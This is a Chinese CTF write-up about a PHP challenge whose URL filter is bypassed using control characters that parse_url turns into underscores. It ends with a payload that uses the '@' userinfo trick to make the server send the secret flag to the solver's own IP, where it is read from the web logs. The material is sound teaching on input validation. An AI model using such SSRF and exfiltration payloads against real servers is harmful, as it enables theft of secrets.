---
title: url中的下划线
date: 2017-10-22 11:18:40
tags: audit
categories:
---

### 0x00.前言

今天再做一道CTF题感觉挺有意思的。

题目链接 http://solveme.safflower.kr/prob/give_me_a_link

```php
 <?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    if(isset($_GET['url'])){
        $url = $_GET['url'];

        if(!preg_match('/^https?\:\/\/'.$_SERVER['HTTP_HOST'].'/i', $url)){
            die('Not allowed URL');
        }

        if(preg_match('/_|\s|\0/', $url)){
            die('Not allowed character');
        }

        $parse = parse_url($url);
        if(basename($parse['path']) !== 'plz_give_me'){
            die('Not allowed path');
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

        echo 'Okay<hr>';
    }

    highlight_file(__FILE__); 
```

代码比较简单，无非就是几个绕过。 主要就是后面的两个正则感觉挺有意思，很显然焦点在于下划线。其实RFC明确禁止将下划线作为域名的一部分，容易造成误解破坏网络秩序。但是以前做的题中也有出现参数中带有点或者

空格变成下划线的例子。就是那一道smile的题。

<!-- more -->

![2](https://myndtt.github.io/images/2.png)



![3](https://myndtt.github.io/images/3.png)



特意参看了一下手册，发现：

![5](https://myndtt.github.io/images/5.png)

实际上这就跟php参数的命名规范有关系。

### 0x01.测试

但是今天这道题目关键的部分不是在参数里面。不过按照上面的方法我们可以进行测试.

代码如下得:

```php
<?php
$url="http://www.test.com/plz
gi
ve";
echo $url;
echo "</br>";
$parsee=parse_url($url);
var_dump($parsee);
echo "</br>";
echo basename($parsee['path']);
?>
```

![4](https://myndtt.github.io/images/4.png)

惊奇发现第一次测试居然可以，等于说换行符可行，后来试了试TAB也可以，但是我们还是没有解决问题。因为原来的题目第二次正则匹配中有个“\s”匹配任意空白符，明显不可以。那么照题目的意思肯定还有其他办法。

### 0x02.突破

接下来看题目关键的代码 :

```
$parse = parse_url($url); //应该是这个parse_url函数是关键
```

接下来又去搜php手册:

![6](https://myndtt.github.io/images/6.png)

ok关键口找到了，那什么是无效的字符呢，我查了查资料 RFC 3986

https://tools.ietf.org/html/rfc3986 对此做出了规范

http://www.360doc.com/content/16/1129/12/33651124_610418471.shtml

这些个不是空白符，且对url是无效字符

![7](https://myndtt.github.io/images/7.png)



进行了测试 没问题 这道题就解决了

![8](https://myndtt.github.io/images/8.png)

分割线--------------------------------------------------------------------------------------------------------------------------------------------------

其实这道题埋了一个伏笔。照题目给的代码 CURLOPT_RETURNTRANSFER 设置为true

```php
$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
```

这并没有将那个文件里面的信息显示出来,也没有复制给变量.这该如何是好。重新回到题目。可以简述为三个问题。

```
1.url参数里面需要有http://加上请求包中host变量  no

2.下划线   get

3.访问http[s]://host/.$flag               no
 
```

1,3问题需要解决，1可以解决，修改头部就可以，至于3，由于没有回显，只能寻找web日志的帮助。在此查看文档得：

![33](http://myndtt.github.io/images/33.png)

url=http://solveme.safflower.kr:1@自己ip/plz%1Agive%1Ame

至于这个payload，最后访问的就是http://自己IP/.$flag，在日志中可以找到flag了

![34](http://myndtt.github.io/images/34.png)